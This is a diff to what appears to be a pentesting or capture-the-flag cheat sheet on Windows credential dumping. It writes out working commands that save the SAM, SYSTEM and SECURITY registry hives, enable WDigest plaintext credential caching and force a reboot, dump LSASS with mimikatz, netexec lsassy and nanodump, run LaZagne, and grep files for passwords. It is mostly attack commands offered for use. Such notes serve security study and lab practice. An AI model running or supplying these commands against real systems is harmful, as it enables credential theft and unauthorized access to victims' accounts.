@@ -2,7 +2,7 @@
 ```bash
 hklm\sam # Contains the hashes associated with local account passwords.
 hklm\system # Contains the system bootkey, which is used to encrypt the SAM database. We will need the bootkey to decrypt the SAM database.
-hklm\security # Contains cached credentials for domain accounts and Services Creds
+hklm\security # Contains LSA +  cached credentials for domain accounts and Services Creds + Sometimes plaintext service creds
 # Copying SAM Registry Hives
 reg.exe save hklm\sam C:\sam.save
 reg.exe save hklm\system C:\system.save
@@ -75,12 +75,14 @@ mimikatz.exe "privilege::debug" "sekurlsa::logonPasswords" exit
 reg add "HKLM\System\CurrentControlSet\Control\SecurityProviders\WDigest" /v UseLogonCredential /t REG_DWORD /d 1 /f
 reg query "HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest" # check , UseLogonCredential  REG_DWORD  0x1
 shutdown /r /t 0 /f # Reboot required
+
 # Dump creds with Mimikatz
 sekurlsa::logonpasswords   # LSASS (all creds + plain text)
 sekurlsa::wdigest          # LSASS WDigest creds only
 # with netexec
 nxc smb victim -u ‘’ -p ‘’ -M lsassy
 netexec smb MS01 -u <user> -p "<pass>" -M nanodump --local-auth# better
+
 
 # LSA = the security authority (concept + secrets on disk / registry)
 # LSASS = the process (lsass.exe) that runs LSA in memor
@@ -213,6 +215,10 @@ start lazagne.exe all
 
 # findstr 
 findstr /SIM /C:"password" *.txt *.ini *.cfg *.config *.xml *.git *.ps1 *.yml *.ods
+
+# search for file name 
+dir C:\ /s /b | find "flag"
+gci C:\ -r -fo | ? {$_.Name -like "flag*"} | % FullName # powwershell
 
 # Credential Hunting - Places to Look
 
